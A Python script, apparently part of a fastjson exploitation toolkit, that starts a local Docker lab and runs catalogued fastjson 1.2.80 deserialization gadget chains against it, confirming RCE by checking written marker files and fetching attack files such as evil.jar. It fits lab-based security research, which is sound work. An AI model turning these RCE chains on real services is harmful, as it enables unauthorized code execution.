"""在 fastjson-1280-lab 验证 1.2.80 各链 RCE：一律以写文件内容为准。"""

from __future__ import annotations

import json
import subprocess
import sys
import time
from pathlib import Path

import httpx

from fastjson_toolkit.poc.v1_2_80.catalog import GADGETS, get_gadget
from fastjson_toolkit.poc.v1_2_80.payloads import build_steps

ROOT = Path(__file__).resolve().parents[1]
LAB = ROOT / "lab" / "fastjson-1280-lab"
PROOF = ROOT / "tmp_lab" / "1280_proof"
BASE = "http://127.0.0.1:18280"


def wait_health(seconds: int = 240) -> dict:
    deadline = time.time() + seconds
    last = ""
    while time.time() < deadline:
        try:
            with httpx.Client(timeout=3.0, trust_env=False) as c:
                r = c.get(f"{BASE}/api/health")
                if r.status_code == 200:
                    return r.json()
                last = r.text
        except Exception as exc:  # noqa: BLE001
            last = str(exc)
        time.sleep(2)
    raise RuntimeError(f"health timeout: {last}")


def reset_cache() -> None:
    with httpx.Client(timeout=5.0, trust_env=False) as c:
        c.post(f"{BASE}/api/reset")


def clear_markers() -> None:
    with httpx.Client(timeout=5.0, trust_env=False) as c:
        c.request("DELETE", f"{BASE}/api/markers")


def get_markers() -> dict:
    with httpx.Client(timeout=5.0, trust_env=False) as c:
        return c.get(f"{BASE}/api/markers").json().get("markers", {})


def post_payload(body: str, timeout: float = 30.0) -> tuple[int, str]:
    with httpx.Client(timeout=timeout, trust_env=False) as c:
        r = c.post(
            f"{BASE}/api/fastjson",
            content=body.encode("utf-8"),
            headers={"Content-Type": "application/json"},
        )
        return r.status_code, r.text[:1500]


def post_steps(steps: list[str]) -> list[tuple[int, str]]:
    reset_cache()
    out: list[tuple[int, str]] = []
    for step in steps:
        out.append(post_payload(step))
        time.sleep(0.35)
    return out


def ensure_lab() -> dict:
    print("[*] docker compose up --build -d")
    subprocess.run(
        ["docker", "compose", "up", "--build", "-d"],
        cwd=str(LAB),
        check=True,
    )
    info = wait_health()
    print("[*] health", json.dumps(info, ensure_ascii=False))
    deps = info.get("deps") or {}
    for key in (
        "jackson_core",
        "commons_io",
        "ant",
        "groovy",
        "aspectjtools",
        "mysql51",
        "postgresql",
        "spring_context",
        "nashorn_urlreader",
    ):
        if not deps.get(key):
            raise RuntimeError(f"靶场缺少依赖: {key}")
    attack = info.get("attack_files") or {}
    for key in ("evil_jar", "bean_postgresql", "bean_jython"):
        if not attack.get(key):
            raise RuntimeError(f"靶场缺少攻击文件: {key}")
    # 容器内可拉
    with httpx.Client(timeout=5.0, trust_env=False) as c:
        for path in (
            "/attack/evil.jar",
            "/attack/bean-postgresql.xml",
            "/attack/bean-jython.xml",
        ):
            r = c.get(f"{BASE}{path}")
            if r.status_code != 200:
                raise RuntimeError(f"无法 GET {path}: {r.status_code}")
    return info


def marker_ok(gadget_id: str) -> bool:
    entry = get_gadget(gadget_id)
    key = Path(entry.marker_file).name
    meta = get_markers().get(key) or {}
    content = (meta.get("content") or "").replace("\r", "")
    expect = entry.marker_content
    # io_copy 源文件带换行
    ok = expect in content or content.strip() == expect.strip()
    print(f"    marker {key}: {meta} expect={expect!r} -> {ok}")
    return bool(meta.get("exists")) and ok


def main() -> int:
    PROOF.mkdir(parents=True, exist_ok=True)
    ensure_lab()
    clear_markers()
    results: dict[str, str] = {}

    for entry in GADGETS:
        name = entry.id
        print(f"[*] {name}  → {entry.marker_file}")
        steps = build_steps(
            name,
            file=entry.marker_file,
            content=entry.marker_content
            if name != "io_copy_write"
            else "FJ1280_READ_SRC\n",
        )
        for i, s in enumerate(steps):
            (PROOF / f"{name}_step{i + 1}.json").write_text(s, encoding="utf-8")
        try:
            clear_markers()
            outs = post_steps(steps)
            for i, (code, text) in enumerate(outs):
                print(f"    step{i + 1} http={code} {text[:120]}")
            # groovy/pg 写文件可能略延迟
            time.sleep(0.8 if name in ("groovy", "postgresql", "jython") else 0.3)
            ok = marker_ok(name)
        except Exception as exc:  # noqa: BLE001
            print(f"    exception: {exc}")
            ok = False
        results[name] = "PASS" if ok else "FAIL"
        print(f"    -> {results[name]}")

    print("SUMMARY", json.dumps(results, ensure_ascii=False, indent=2))
    (PROOF / "summary.json").write_text(
        json.dumps(results, ensure_ascii=False, indent=2), encoding="utf-8"
    )
    failed = [k for k, v in results.items() if v != "PASS"]
    if failed:
        print("[!] failed:", ", ".join(failed))
        return 1
    print("[+] all RCE file-write proofs passed on fastjson-1280-lab")
    return 0


if __name__ == "__main__":
    sys.exit(main())
